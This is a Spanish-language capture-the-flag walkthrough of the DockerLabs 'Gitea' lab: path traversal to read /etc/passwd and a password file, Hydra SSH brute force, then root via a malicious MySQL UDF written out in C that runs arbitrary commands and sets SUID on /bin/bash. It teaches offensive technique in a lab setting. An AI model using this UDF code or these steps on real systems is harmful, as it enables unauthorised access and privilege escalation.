## Introducción

Este documento presenta la resolución completa de la máquina **Gitea**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone una instancia de Gitea con repositorios públicos que contienen credenciales de MySQL y documentación sobre una vulnerabilidad de **path traversal**. Esta vulnerabilidad permite leer archivos del sistema, incluyendo un archivo con múltiples contraseñas que, tras un ataque de fuerza bruta con Hydra, otorga acceso SSH como `designer`.
Una vez dentro, se descubre que MySQL se ejecuta como `root`. Se crea una **User-Defined Function (UDF)** maliciosa para ejecutar comandos del sistema, permitiendo establecer el bit SUID en `/bin/bash` y obtener acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Gitea.zip
sudo bash auto_deploy.sh Gitea.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Gitea/{content,exploits,nmap,scripts}
cd Gitea
```

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Path traversal

Se prueba la vulnerabilidad de path traversal:

```bash
curl -s 'http://gitea.dl/download?filename=/etc/passwd'
```

![Passwd TP](https://res.cloudinary.com/dewqswzke/image/upload/v1766120519/PasswdTP_ghmcah.png)

Se identifica al usuario `designer`. Se lee `/opt/info.txt`:

```bash
curl -s "http://gitea.dl/download?filename=/opt/info.txt"
```

### 2.2 Fuerza bruta SSH

Se extraen posibles contraseñas de `/opt/info.txt`:

```bash
curl -s 'http://gitea.dl/download?filename=/opt/info.txt' | \
awk -F '[: -]' '{print $2}' | \
grep -v '^$' | sort -u > passwords.txt
```

Se utiliza Hydra:

```bash
hydra -l designer -P passwords.txt ssh://172.17.0.2 -I -t 64 -f
```

![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1766120518/Hydra_ru7xen.png)

Se obtienen credenciales: `designer:g3n3ralP@ssw0rd`

### 2.3 Acceso SSH

```bash
ssh designer@172.17.0.2
```

![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1766120522/SSH_hdaoq8.png)

## Paso 3 — Escalada de privilegios

### 3.1 De designer → root

MySQL se ejecuta como root:

```bash
ps aux | grep mysql
```

Se verifica acceso con las credenciales del repositorio:

```bash
mysql -u admin -pPASSWORD -e "SELECT USER(), CURRENT_USER();"
```

Se crea una UDF maliciosa en C:

**udf_shell.c:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mysql.h>

my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    if (args->arg_count != 1) {
        strcpy(message, "sys_exec() requiere un argumento");
        return 1;
    }
    args->arg_type[0] = STRING_RESULT;
    return 0;
}

char *sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *result, 
               unsigned long *length, char *is_null, char *error) {
    if (args->args[0]) {
        system(args->args[0]);
    }
    *is_null = 0;
    return NULL;
}
```

Se compila y se copia al directorio de plugins de MySQL:

```bash
gcc -fPIC -shared -o udf_shell.so udf_shell.c $(mysql_config --cflags) $(mysql_config --libs)
cp udf_shell.so /usr/lib/mysql/plugin/
```

Se crea la función en MySQL:

```bash
mysql -u admin -pPASSWORD << 'EOF'
DROP FUNCTION IF EXISTS sys_exec;
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf_shell.so';
EOF
```

Se ejecuta un comando para establecer el bit SUID en `/bin/bash`:

```bash
mysql -u admin -pPASSWORD -e "SELECT sys_exec('chmod u+s /bin/bash');"
```

Se obtiene una shell privilegiada:

```bash
/bin/bash -p
```
